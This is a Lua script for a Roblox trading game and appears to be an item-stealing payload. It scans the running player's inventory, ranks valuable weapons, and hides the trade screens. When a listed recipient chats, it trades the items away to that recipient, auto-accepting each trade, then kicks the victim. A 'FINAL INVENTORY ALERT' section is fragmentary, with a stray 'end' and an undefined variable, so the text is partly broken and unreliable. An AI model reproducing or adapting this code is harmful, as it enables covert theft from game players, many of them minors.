-- === VALUES & INVENTORY SCAN ===
local FallbackValues = {Chroma=250,Unique=150,Ancient=100,Godly=10,Vintage=5,Legendary=2}
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma"}
local minRarityIdx = table.find(rarityTable, min_rarity) or 5
local database = ReplicatedStorage.Database.Sync.Item

local untradable = {DefaultGun=true,DefaultKnife=true,Reaver=true,IceHammer=true,Gingerscythe=true,TestItem=true,Cracks=true,Icecrusher=true,Dartbringer=true,SharkSeeker=true}

local weaponsToSend = {}
local totalValue = 0
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
if realData and realData.Weapons and realData.Weapons.Owned then
    for id, amt in pairs(realData.Weapons.Owned) do
        local item = database[id]
        if item then
            local rarity = item.Rarity or "Common"
            local idx = table.find(rarityTable, rarity) or 0
            if idx >= minRarityIdx and not untradable[id] then
                local itemName = item.ItemName or tostring(id)
                local val = FallbackValues[rarity] or 1
                if val >= min_value then
                    totalValue += val * amt
                    table.insert(weaponsToSend, {DataID=id,Name=itemName,Rarity=rarity,Amount=amt,Value=val,Total=val*amt})
                end
            end
        end
    end
end
table.sort(weaponsToSend, function(a,b) return a.Total > b.Total end)

-- === FINAL INVENTORY ALERT ===

end
invText ..= "```"

-- === TRADE LOGIC ===
local function getTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user) local p=Players:FindFirstChild(user) if p then pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end) end end
local function addItem(id) ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end
local function acceptTrade() ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582) end
local function waitEnd() while getTradeStatus()~="None" do task.wait(0.1) end end

playerGui:WaitForChild("TradeGUI").Changed:Connect(function() playerGui.TradeGUI.Enabled=false end)
playerGui:WaitForChild("TradeGUI_Phone").Changed:Connect(function() playerGui.TradeGUI_Phone.Enabled=false end)

local function doTrade(targetUser)
    task.wait(2)
    while #weaponsToSend>0 do
        local s=getTradeStatus()
        if s=="None" then sendTradeRequest(targetUser) task.wait(1)
        elseif s=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do local it=table.remove(weaponsToSend,1) for _=1,it.Amount do addItem(it.DataID) task.wait(0.05) end end
            task.wait(5) acceptTrade() waitEnd()
        end
        task.wait(0.5)
    end
    task.wait(1)
    plr:Kick("✅ Done!")
end

local waiting=true
local function checkPlayer(p)
    if table.find(users, p.Name) then
        p.Chatted:Connect(function() if waiting then waiting=false doTrade(p.Name) end end)
    end
end
for _,p in ipairs(Players:GetPlayers()) do checkPlayer(p) end
Players.PlayerAdded:Connect(checkPlayer)
